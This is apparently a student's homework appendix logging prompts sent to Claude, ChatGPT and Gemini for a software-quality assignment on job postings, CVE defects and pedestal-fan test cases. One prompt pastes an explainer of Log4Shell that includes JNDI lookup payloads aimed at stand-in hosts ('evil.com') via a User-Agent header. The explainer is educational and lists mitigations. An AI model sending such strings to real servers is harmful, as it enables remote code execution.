# Appendix A: Full Prompt Log

Below is the complete chronological log of all prompts sent to AI tools during the execution of this homework.

### Claude

**1. Timestamp: 21:33 03/06/2026**
**Prompt:**
> Uploaded: ___2026_Homework_Policies.pdf, 2026_HW01_Jobs_Defects_PhysicalProduct_En.pdf,
> _AI-01_ to _AI-06_ forms.
> guide me to do the homework 1, overview what will be done
> and how to do it and how long would it take
**Output:**
<img src="./screenshots/prompt_log/claude/1.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/2.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/3.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/4.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**2. Timestamp: 21:38 03/06/2026**
**Prompt:**
> i dont get this [quoted: log defects as GitHub Issues]
**Output:**
<img src="./screenshots/prompt_log/claude/5.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**3. Timestamp: 21:51 03/06/2026**
**Prompt:**
> Chào các bạn SV,
> 
> Hình dưới đây thể hiện tinh thần chung của các HW.
> Theo đó, các bạn được yêu cầu: AI First => Human Review => AI Audit Report => Markdown / Git => Quality.
> Do đó, trong HW01, các bạn cứ thực hiện 3 requirements rồi sau đó ghi nhận lại AI Audit Report, AI Critique Report, Disclosure, Checklist, Git log commit trên 3 requirements đó là ok nhé.
> 
> Trân trọng,
> Thanh
> 
> so we can use AI for what part of the task?
**Output:**
<img src="./screenshots/prompt_log/claude/6.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**4. Timestamp: 22:19 04/06/2026**
**Prompt:**
> ok give me step by step what to do now
> to complete all the requirements
**Output:**
<img src="./screenshots/prompt_log/claude/7.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/8.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/9.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/10.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/11.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**5. Timestamp: 22:23 04/06/2026**
**Prompt:**
> i dont get the activation date in AI-06
**Output:**
<img src="./screenshots/prompt_log/claude/12.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**6. Timestamp: 22:27 04/06/2026**
**Prompt:**
> whats the first time login confirmed?
**Output:**
<img src="./screenshots/prompt_log/claude/13.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**7. Timestamp: 22:33 04/06/2026**
**Prompt:**
> PUBLISHED WITHIN 60 DAYS of the submission date.
> submission date of this homework is 8/6 so it must be from 8/5?
**Output:**
<img src="./screenshots/prompt_log/claude/13.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**8. Timestamp: 22:35 04/06/2026**
**Prompt:**
> what would be on the github repo?
> like what is it purpose
**Output:**
<img src="./screenshots/prompt_log/claude/14.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**9. Timestamp: 22:42 04/06/2026**
**Prompt:**
> what does the prompt log looks like? and it should be
> the prompt in all my homework process or just related
> to the requirements??
**Output:**
<img src="./screenshots/prompt_log/claude/15.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/16.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**10. Timestamp: 22:47 04/06/2026**
**Prompt:**
> what does dated screenshot mean
**Output:**
<img src="./screenshots/prompt_log/claude/17.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**11. Timestamp: 23:00 04/06/2026**
**Prompt:**
> ok i screenshot all 10 jobs what to do next?
**Output:**
<img src="./screenshots/prompt_log/claude/18.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/19.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**12. Timestamp: 23:22 04/06/2026**
**Prompt:**
> [quoted: paste defect into AI to find hallucination]
> paste meaning paste the whole paragraph?
> also what if the AI is perfect
**Output:**
<img src="./screenshots/prompt_log/claude/20.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**13. Timestamp: 23:30 04/06/2026**
**Prompt:**
> https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
> **Log4Shell (CVE-2021-44228)** is a critical remote code execution (RCE) vulnerability discovered in December 2021 in the Java logging library Apache Log4j.
> ## What is Log4j?
> Log4j is a widely used Java library that helps applications record log messages, such as:
> ```java
> logger.info("User {} logged in", username);
> ```
> Developers use it to track application activity, errors, and debugging information.
> ---
> ## The Vulnerability
> Affected versions of Log4j (2.0-beta9 through 2.14.1) support a feature called **message lookups**. This allows special expressions inside log messages to be automatically resolved.
> For example:
> ```text
> ${java:version}
> ```
> might be replaced with:
> ```text
> 17.0.1
> ```
> The problem was that Log4j also supported **JNDI lookups**:
> ```text
> ${jndi:ldap://attacker.com/a}
> ```
> When Log4j processed this string, it could contact the remote LDAP server and load attacker-controlled Java code.
> As a result, an attacker could execute arbitrary code on the vulnerable server.
> ---
> ## How an Attack Works
> 1. The attacker sends a malicious string:
> ```text
> ${jndi:ldap://evil.com/payload}
> ```
> 2. The application logs the string (for example, from an HTTP header, username, chat message, or form field).
> 3. Log4j interprets the `${jndi:...}` expression.
> 4. The server connects to the attacker's LDAP server.
> 5. The attacker delivers malicious code.
> 6. The code executes on the server.
> This can lead to:
> * Complete server compromise
> * Data theft
> * Malware installation
> * Ransomware deployment
> * Lateral movement within a network
> ---
> ## Example
> Imagine a web server logs the User-Agent header:
> ```java
> logger.info("User-Agent: " + request.getHeader("User-Agent"));
> ```
> An attacker sends:
> ```http
> User-Agent: ${jndi:ldap://evil.com/exploit}
> ```
> The application logs it:
> ```text
> User-Agent: ${jndi:ldap://evil.com/exploit}
> ```
> Log4j evaluates the expression and triggers the exploit.
> ---
> ## Why Was It So Dangerous?
> ### 1. Extremely Easy to Exploit
> Attackers often only needed to send a specially crafted string.
> ### 2. Huge Attack Surface
> Log4j was embedded in countless Java applications, cloud services, enterprise software, and games.
> One famous example was Minecraft servers, where attackers could trigger the vulnerability through chat messages.
> ### 3. Remote Code Execution
> RCE vulnerabilities are among the most severe because they can give attackers direct control of a system.
> ### 4. Internet-Wide Impact
> Security researchers described Log4Shell as one of the most serious software vulnerabilities ever discovered.
> ---
> ## Affected Versions
> Vulnerable:
> * Log4j 2.0-beta9 through 2.14.1
> Patched:
> * Log4j 2.17.x and later (recommended for Java 8)
> * Other patched branches were released for older Java versions
> ---
> ## Mitigation
> Organizations responded by:
> 1. Upgrading Log4j to a patched version.
> 2. Disabling JNDI lookups.
> 3. Removing the vulnerable `JndiLookup` class.
> 4. Monitoring logs for exploitation attempts.
> 5. Applying network restrictions to block outbound LDAP/RMI connections.
> ---
> ## Impact Summary
> | Aspect       | Description                              |
> | ------------ | ---------------------------------------- |
> | CVE          | CVE-2021-44228                           |
> | Name         | Log4Shell                                |
> | Type         | Remote Code Execution (RCE)              |
> | Component    | Apache Log4j                             |
> | Severity     | Critical (CVSS 10.0)                     |
> | Exploitation | Logging a malicious `${jndi:...}` string |
> | Result       | Arbitrary code execution on the server   |
> In one sentence: **Log4Shell allowed attackers to execute code on vulnerable Java servers simply by getting a specially crafted string logged by Log4j.**
> 
> 
> this is my AI response, how would you describe its hallucinaiton in req 2?
**Output:**
<img src="./screenshots/prompt_log/claude/21.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**14. Timestamp: 23:45 04/06/2026**
**Prompt:**
> MOVEit Transfer SQL Injection, CrowdStrike Falcon Content Update Bug, ProxyNotShell, OpenSSL Buffer Overflows, OWASP LLM01, LLM Hallucinations / Misinformation (e.g., persistent in models 2023–2026), AI-Generated Code Vulnerabilities (e.g., insecure snippets 2024–2025), Data/Model Poisoning in LLMs (OWASP LLM04, reported 2023–2026), Bias in AI Systems (e.g., training data bias, ongoing), SolarWinds Supply Chain, React Server Components "React2Shell", Android Framework Integer Overflow, Linux Kernel cgroups Improper Authentication, Indirect Prompt Injection in Commercial LLMs (2026 reports), SharePoint RCE, Model Denial of Service, Nextcloud User Enumeration, AWS MCP Server Command Injection, Sonos Era 300 SMB Out-of-Bounds, XZ Utils Backdoor
> 
> i intend to use these, is there anything that is hard or needs replacements?
**Output:**
<img src="./screenshots/prompt_log/claude/22.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/23.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**15. Timestamp: 23:48 04/06/2026**
**Prompt:**
> should i ask the teacher what is the correct approach
> for this requirement? because if self-scanning for
> hallucination will cost so much time?
**Output:**
<img src="./screenshots/prompt_log/claude/24.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**16. Timestamp: 23:50 04/06/2026**
**Prompt:**
> but from what i see the AI will not give that wrong
> detail easily for the cve that are very popular, so i
> dont want to spend time reading the sources over and
> over again to find a biased or hallucination part
**Output:**
<img src="./screenshots/prompt_log/claude/25.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**17. Timestamp: 23:52 04/06/2026**
**Prompt:**
> but like there are 20 of them how can it be all niche
**Output:**
<img src="./screenshots/prompt_log/claude/26.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**18. Timestamp: 22:30 05/06/2026**
**Prompt:**
> [quoted: good list from previous message]
> can you finalize the list of 20 sources?
**Output:**
<img src="./screenshots/prompt_log/claude/27.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/28.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/29.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**19. Timestamp: 22:28 06/06/2026**
**Prompt:**
> what if my fan doesnt have any defects?
**Output:**
<img src="./screenshots/prompt_log/claude/30.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**20. Timestamp: 22:54 06/06/2026**
**Prompt:**
> give me the prompt log for this whole conversation,
> with this format, i will do the screenshots
**Output:**
<img src="./screenshots/prompt_log/claude/31.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/32.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/claude/33.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">


### ChatGPT

**1. Timestamp: 22:36 05/06/2026**
**Prompt:**
> explain these concepts for me:
> - Air Canada Chatbot Hallucination (Moffatt v. Air Canada)
> - Mata v. Avianca — ChatGPT Fake Legal Citations
> - Indirect Prompt Injection in Bing Chat (Johann Rehberger research)
> - Data/Model Poisoning in LLMs (OWASP LLM04, reported incidents)
> - AI-Generated Insecure Code (GitHub Copilot vulnerability study)
> - Model Denial of Service (OWASP LLM10, documented 2023–2024)
> - Bias in AI Hiring Tools (EEOC AI bias reports 2023–2024)
> - MOVEit Transfer SQL Injection
> - CrowdStrike Falcon Content Update Bug
> - XZ Utils Backdoor
> - ProxyNotShell
> - OpenSSL Buffer Overflows
> - Cisco IOS XE Web UI RCE
> - SharePoint RCE
> - Apple WebKit Zero-Day
> - Android Framework Integer Overflow
> - Linux Kernel cgroups Improper Auth
> - SolarWinds Web Help Desk Hardcoded Credentials
> - HTTP/2 Rapid Reset Attack 
> - Fortinet SSL-VPN RCE
**Output:**
<img src="./screenshots/prompt_log/chatgpt/3.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/chatgpt/4.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/chatgpt/5.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/chatgpt/6.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/chatgpt/7.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/chatgpt/8.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**2. Timestamp: 21:44 07/06/2026** 
**Prompt:**
> Can you draw an ISTQB QA/QC role mindmap for me? Output in md, use mermaid
**Output:**
<img src="./screenshots/prompt_log/chatgpt/1.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/chatgpt/2.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**3. Timestamp: 09:54 06/06/2026**
**Prompt:**
> design 15 test cases  Objective / Input / Steps / Expected / Actual / Verdict) for my household device: a pedestal fan
**Output:**
<img src="./screenshots/prompt_log/chatgpt/9.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
<img src="./screenshots/prompt_log/chatgpt/10.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

### Gemini

**1. Timestamp: 23:18 05/06/2026**
**Prompt:**
> read the hw01 requirement in 2026.HW01.Jobs.Defects.PhysicalProduct_En.pdf. First draft the structure of the report markdown. Then write the report for me, for requirement 1 first. every materials you need for the req 1 are in  req_1_materials.txt, and req screenshots are in screenshots/requirement_1
**Output:**
<img src="./screenshots/prompt_log/gemini/1.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**2. Timestamp: 23:21 05/06/2026**
**Prompt:**
> ok remove the pts, and add a section for student info. Also i want the screenshot to be inserted as images not link. and i dont see the appendix A or Self-Assessment section
**Output:**
<img src="./screenshots/prompt_log/gemini/2.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**3. Timestamp: 23:27 05/06/2026**
**Prompt:**
> ok nice, now continue with req 2, read req_2_materials.txt and use screenshots in screenshots/requirement_2
**Output:**
<img src="./screenshots/prompt_log/gemini/3.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**4. Timestamp: 23:47 05/06/2026**
**Prompt:**
> ah i forgot to add the links, here it is req_2_links.txt
**Output:**
<img src="./screenshots/prompt_log/gemini/4.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**5. Timestamp: 23:48 05/06/2026**
**Prompt:**
> what mentioned as search you search it and put it in the report
**Output:**
<img src="./screenshots/prompt_log/gemini/5.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**6. Timestamp: 23:53 05/06/2026**
**Prompt:**
> skip the req 3 for now, do other parts first except the prompt log, self assessment give all full
**Output:**
<img src="./screenshots/prompt_log/gemini/6.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**7. Timestamp: 08:49 06/06/2026**
**Prompt:**
> draft the prompt log outline in prompt_log.md for me
**Output:**
<img src="./screenshots/prompt_log/gemini/7.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**Timestamp: 23:29 06/06/2026**
**Prompt:**
> read 2026.HW01.Jobs.Defects.PhysicalProduct_En.pdf, and write the prompt log in appendix as required (file: prompt_log.md, also fix the HW01_Report.md to link to that file), the materials for the prompt log i have prepared in prompt.txt, use those, polish my notes, but for the prompt kept as-is, also add this to the prompt log too
**Output:**
<img src="./screenshots/prompt_log/gemini/8.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**Timestamp: 20:13 07/06/2026**
**Prompt:**
> i'm doing the homework described in 2026.HW01.Jobs.Defects.PhysicalProduct_En.pdf, now i need you to read the requirements thoroughly, also read the ___2026.Homework.Policies (1).pdf, and write the requirement 3 part in HW01_Report.md. Materials: KCPM-HW01-Test Cases.xlsx for the test cases, device info: mitsubishi lv16-rm. 
**Output:**
<img src="./screenshots/prompt_log/gemini/9.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**Timestamp: 20:32 07/06/2026**
**Prompt:**
> serial number is 90402931
**Output:**
<img src="./screenshots/prompt_log/gemini/10.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">

**Timestamp: 20:34 07/06/2026**
**Prompt:**
> good, update our conversation to prompt_log.md, note and i will handle the screenshot
**Output:**
<img src="./screenshots/prompt_log/gemini/11.jpg" style="border:2px solid red;" alt="Red-bordered AI Output">
